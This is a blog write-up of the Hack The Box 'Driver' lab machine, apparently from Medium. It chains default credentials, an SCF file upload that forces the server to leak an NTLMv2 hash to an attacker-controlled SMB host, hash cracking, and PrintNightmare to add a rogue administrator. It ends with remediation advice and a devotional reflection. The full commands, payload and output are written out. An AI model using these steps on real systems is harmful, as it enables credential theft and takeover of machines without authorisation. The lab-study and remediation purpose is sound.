# ⚡ Driver

***

### ⚡ Zero to Root: The Ultimate Guide to Hack The Box Driver 🏆

![](https://cdn-images-1.medium.com/max/800/1*0HpRMtV4c5em8knt-FU00A.png)

### Executive Summary

**Target:** _Driver (Hack The Box)_ **OS:** _Windows_ **Difficulty:** _Easy_ **Attack Vectors:** _Default Credentials -> SCF File Attack (SMB) -> PrintNightmare (CVE-2021–1675)._

This assessment targeted “Driver,” a Windows-based machine acting as a print server. The initial foothold was gained by leveraging weak default credentials on the exposed “MFP Firmware Update Center” web interface. This access allowed for the upload of a malicious **SCF** file, triggering an authentication attempt back to the attacker’s machine and leaking the **NTLMv2** password hash for the user **`tony`**.

Lateral movement was achieved by cracking the captured hash and logging in via Windows Remote Management **(WinRM)**. Finally, System privilege escalation was accomplished by exploiting the _**“PrintNightmare”**_ vulnerability _**(CVE-2021–1675)**_ in the Windows Print Spooler service, allowing the creation of a rogue administrator account.

### 1.0 Initial Foothold

#### 1.1 Reconnaissance & Enumeration

**1.1.1 Nmap Scan Analysis**

* The assessment began with a full TCP port scan using Nmap to identify all open services and gather version information on the target **`10.10.11.106`**.

```
──(nicholas㉿Nicholas)-[~/HTB/Labs/Driver]
└─$ nmap -sC -sV -A -vvv  10.10.11.106
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 13:51 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:51
Completed NSE at 13:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:51
Completed NSE at 13:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:51
Completed NSE at 13:51, 0.00s elapsed
Initiating Ping Scan at 13:51
Scanning 10.10.11.106 [4 ports]
Completed Ping Scan at 13:51, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:51
Completed Parallel DNS resolution of 1 host. at 13:51, 13.18s elapsed
DNS resolution of 1 IPs took 13.18s. Mode: Async [#: 2, OK: 0, NX: 0, DR: 1, SF: 0, TR: 4, CN: 0]
Initiating SYN Stealth Scan at 13:51
Scanning 10.10.11.106 [1000 ports]
Discovered open port 135/tcp on 10.10.11.106
Discovered open port 80/tcp on 10.10.11.106
Discovered open port 445/tcp on 10.10.11.106
Discovered open port 5985/tcp on 10.10.11.106
Completed SYN Stealth Scan at 13:51, 6.39s elapsed (1000 total ports)
Initiating Service scan at 13:51
Scanning 4 services on 10.10.11.106
Completed Service scan at 13:51, 6.46s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.106
Retrying OS detection (try #2) against 10.10.11.106
Initiating Traceroute at 13:51
Completed Traceroute at 13:51, 0.08s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 13:51
Completed Parallel DNS resolution of 2 hosts. at 13:52, 13.03s elapsed
DNS resolution of 2 IPs took 13.03s. Mode: Async [#: 2, OK: 0, NX: 0, DR: 2, SF: 0, TR: 8, CN: 0]
NSE: Script scanning 10.10.11.106.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:52
NSE Timing: About 99.82% done; ETC: 13:52 (0:00:00 remaining)
Completed NSE at 13:52, 41.43s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:52
Completed NSE at 13:52, 0.27s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:52
Completed NSE at 13:52, 0.01s elapsed
Nmap scan report for 10.10.11.106
Host is up, received echo-reply ttl 127 (0.066s latency).
Scanned at 2025-12-21 13:51:34 EST for 73s
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
445/tcp  open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows 10 1607 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 11 (86%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Vista or Windows 7 (86%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=12/21%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=694841FF%P=x86_64-pc-linux-gnu)
SEQ(SP=108%GCD=1%ISR=107%TI=I%II=I%SS=S%TS=A)
SEQ(SP=F5%GCD=1%ISR=106%TI=I%II=I%SS=S%TS=A)
OPS(O1=M552NW8ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552ST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M552NW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.167 days (since Sun Dec 21 09:51:45 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=245 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 18115/tcp): CLEAN (Timeout)
|   Check 2 (port 65219/tcp): CLEAN (Timeout)
|   Check 3 (port 26928/udp): CLEAN (Timeout)
|   Check 4 (port 47568/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 6h59m39s, deviation: 0s, median: 6h59m39s
| smb2-time:
|   date: 2025-12-22T01:51:48
|_  start_date: 2025-12-21T21:51:38

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   68.51 ms 10.10.14.1
2   68.64 ms 10.10.11.106

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:52
Completed NSE at 13:52, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:52
Completed NSE at 13:52, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:52
Completed NSE at 13:52, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.10 seconds
           Raw packets sent: 2088 (95.556KB) | Rcvd: 39 (2.408KB)
```

#### 1.2 Key Findings

* **Port 80 (HTTP):** Web server prompting for Basic Auth (MFP Firmware Update Center).
* **Port 445 (SMB):** Windows File Sharing enabled.
* **Port 5985 (WinRM):** Windows Remote Management is exposed, suggesting potential for remote shell access if credentials are found.

#### 1.3 Web Application Enumeration

**1.3.1 Analysis:** Navigating to **`http://driver.htb`**, we were presented with a login prompt for the "MFP Firmware Update Center."

**1.3.2 Vulnerability Discovery:** We attempted standard default credentials.

* **Username:Password** **`admin:admin`**

![](https://cdn-images-1.medium.com/max/800/1*K3kM9WHZOOGq-1MjNOy7jQ.png)

* **Result:** Successful login.

![](https://cdn-images-1.medium.com/max/800/1*onnFxWeUDtG7-uUU0tMnEQ.png)

**1.3.3 Feature Abuse:** Inside the dashboard, a “Firmware Updates” tab allowed for file uploads. Since the server processes these files, this feature is a candidate for forced authentication attacks.

### 2.0 Initial Shell

#### 2.1 Exploitation (SCF File Attack)

**2.1.1 The Exploit**

* The server allows users to upload files which are likely stored on a share accessed by the system. By uploading a malicious **`.scf`** (Shell Command File), we can abuse the Windows Explorer icon rendering behavior. The file directs the system to look for an icon at a remote SMB share (our attacking machine), forcing the server to send its NTLMv2 hash to us.

**2.1.2 Tool Setup**

* We configured **`Responder`** on the attack box to listen on the **`tun0`** interface for incoming SMB connections.

```
sudo responder -I tun0
```

**2.1.3 Execution**

* We created a malicious file named **`shell.scf`**.

**File Content (`shell.scf`):**

```
[Shell]
Command=2
IconFile=\\10.10.14.19\test.ico
[Taskbar]
Command=ToggleDesktop
```

_(Note:_ _**`10.10.14.19`**_ _was our specific_ _**`tun0`**_ _IP address for this session)._

We navigated to the “Firmware Updates” page on the web dashboard and uploaded this file.

**2.1.4 Output Analysis**

**`Responder`** immediately captured an incoming SMB connection from the target server (10.10.11.106) and dumped the NTLMv2-SSP hash for the user **tony**.

```
[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:0fc7b4b384c2426e:891E74FF63AEAFE42E0C7F97EDD65B9F:010100000000000080614FFD8F72DC017F88E258BED21BCB000000000200080037004C004D00520001001E00570049004E002D0031003700350042003800340044003900440047004C0004003400570049004E002D0031003700350042003800340044003900440047004C002E0037004C004D0052002E004C004F00430041004C000300140037004C004D0052002E004C004F00430041004C000500140037004C004D0052002E004C004F00430041004C000700080080614FFD8F72DC0106000400020000000800300030000000000000000000000000200000A3B77EDA7908C8BEF4C78340B75522D07F247BD1FABE5C1DDC88D51C604A356B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003900000000000000000000000000
```

#### 2.2 Credential Exfiltration

**2.2.1 Cracking the Hash**

* We saved the full hash string to a file named **`tony.hash`**. Using **`hashcat`** with mode **`5600`** (NetNTLMv2), we cracked the hash against the **`rockyou.txt`** wordlist.

```
hashcat -m 5600 tony.hash /usr/share/wordlists/rockyou.txt
```

**Password Found:** **`liltony`**

**2.2.2 Access**

* Since our initial Nmap scan identified that Port 5985 (WinRM) was open, we used **`evil-winrm`** to log in directly using the cracked credentials.

```
evil-winrm -i driver.htb -u tony -p liltony
```

**Result:** Successful login as **`tony`**. We retrieved the user flag from the Desktop.

```
*Evil-WinRM* PS C:\Users\tony\Documents> cd ..
*Evil-WinRM* PS C:\Users\tony> cd Desktop
*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
cfccce5ba95bb9be7f2cd73ec6542c5d
```

### 3.0 Privilege Escalation

#### 3.1 Exploitation (PrintNightmare CVE-2021–1675)

**3.1.1 Vulnerability Identification**

* Given the machine’s name **“Driver”** and its role as a print server, we suspected it was vulnerable to **PrintNightmare**. This vulnerability allows authenticated users to exploit the Windows Print Spooler service to load malicious drivers and execute code as **SYSTEM**.
* We verified the service was active using PowerShell:

```
*Evil-WinRM* PS C:\Users\tony\Documents> Get-Service Spooler

Status   Name               DisplayName
------   ----               -----------
Running  Spooler            Print Spooler
```

**Result:** The status returned **`Running`**.

**3.1.2 Execution & Troubleshooting**

* We downloaded the exploit script (**`CVE-2021-1675.ps1`**) to our attack box and uploaded it to the target using **`evil-winrm`**.

```
┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Driver]
└─$ wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1
--2025-12-21 16:07:05--  https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 178561 (174K) [text/plain]
Saving to: ‘CVE-2021-1675.ps1’

CVE-2021-1675.ps1   100%[===================>] 174.38K  --.-KB/s    in 0.1s

2025-12-21 16:07:06 (1.77 MB/s) - ‘CVE-2021-1675.ps1’ saved [178561/178561]
```

```
Evil-WinRM* PS C:\Users\tony\Desktop> upload CVE-2021-1675.ps1

Info: Uploading /home/nicholas/HTB/Labs/Driver/CVE-2021-1675.ps1 to C:\Users\tony\Desktop\CVE-2021-1675.ps1

Data: 238080 bytes of 238080 bytes copied

Info: Upload successful!
```

* When attempting to import the module, we encountered a **`PSSecurityException`** because script execution was disabled on the target. To fix this, we bypassed the execution policy for our current process:

```
*Evil-WinRM* PS C:\Users\tony\Desktop> Set-ExecutionPolicy Bypass -Scope Process
```

* With the policy bypassed, we imported the module and fired the exploit. We targeted the spooler service to create a new local administrator named **`hacker`**.

```
*Evil-WinRM* PS C:\Users\tony\Desktop> Import-Module .\CVE-2021-1675.ps1
*Evil-WinRM* PS C:\Users\tony\Desktop> Invoke-Nightmare -NewUser "hacker" -NewPassword "P@ssw0rd123!" -DriverName "Xerox"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user hacker as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

_**Note: The Print Spooler service on this machine is unstable. If the command hangs, terminate it with**_ _**`Ctrl+C`**_ _**and try again immediately. It often takes two attempts to succeed.**_

**Result:** **`[+] Successfully added user 'hacker' to local group 'Administrators'`**

**3.1.3 Root Access**

* We verified the user was created (**`net user hacker`**) and then terminated our current session. We logged back in using the newly created administrator credentials.

```
┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Driver]
└─$ evil-winrm -i 10.10.11.106 -u hacker -p 'P@ssw0rd123!'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\hacker\Documents>
```

* Once authenticated as an Administrator, we navigated to the Administrator’s desktop to retrieve the final flag.

```
──(nicholas㉿Nicholas)-[~/HTB/Labs/Driver]
└─$ evil-winrm -i 10.10.11.106 -u hacker -p 'P@ssw0rd123!'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\hacker\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
aaa1110f0d2a9bd838d1fdd269b3d662
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

![](https://cdn-images-1.medium.com/max/800/1*UA_zoa1nH-7U0KCu_8WsoQ.png)

### 4.0 Conclusion & Remediation

#### 4.1 Summary of Findings

The “Driver” machine demonstrated how legacy Windows features and unpatched services can be chained together to compromise a system completely. The attack path relied on two critical failures:

1. **SCF File Upload:** The ability to upload a file that forces the operating system to initiate an outbound SMB connection.
2. **PrintNightmare:** An unpatched vulnerability in the Windows Print Spooler service that allowed for local privilege escalation.

#### 4.2 Remediation Strategy

To secure this system and prevent similar attacks in the future, the following steps are recommended:

* **Block Outbound SMB:** Configure the network firewall to block all outbound traffic on TCP Port 445. Servers generally do not need to initiate SMB connections to the internet or external clients.
* **Disable NTLM:** Where feasible, disable NTLM authentication and enforce Kerberos to prevent hash capture attacks.
* **Patch Management:** Apply Microsoft Security Update KB5004945 (or newer) to patch the PrintNightmare vulnerability.
* **Disable Print Spooler:** On servers that do not function as dedicated print servers (especially Domain Controllers), the Print Spooler service should be permanently disabled.

***

### 5.0 Rooted By Faith

### _Psalm 32:8 — “I will instruct you and teach you in the way you should go; I will counsel you with my loving eye on you.”_

**Application:** The machine “Driver” was compromised because it followed a bad set of instructions — a malicious driver exploit that led to a total system takeover. The system trusted input it shouldn’t have, and it lacked the safeguards to distinguish between a legitimate update and a trap.

In our spiritual walk, we are often like this server. We look for “drivers” — influences, trends, or emotions — to tell us where to go and how to function. If we let the world or our own pride drive us, we open ourselves up to vulnerabilities that the enemy can exploit. This verse is a promise that God is the only safe Driver. He doesn’t just point the way; He instructs and counsels us with a loving eye, ensuring our “firmware” is updated with His wisdom so we don’t crash when tested.

### 🚀🚀Join the Mission🚀🚀

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

* Is there a specific tool you wish existed?
* Is there a hacking concept you want me to learn and explain?
* Do you have a “brick wall” you’re hitting in your own research?

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

[**Join the Iron-Breach Discord Server!**\
_&#x41;n advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…_&#x64;iscord.gg](https://discord.gg/8buAHtm2fK)

By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [December 25, 2025](https://medium.com/p/d7f5da295946).

[Canonical link](https://medium.com/@nicholasmullenski/zero-to-root-the-ultimate-guide-to-hack-the-box-driver-d7f5da295946)

Exported from [Medium](https://medium.com) on September 1, 2026.
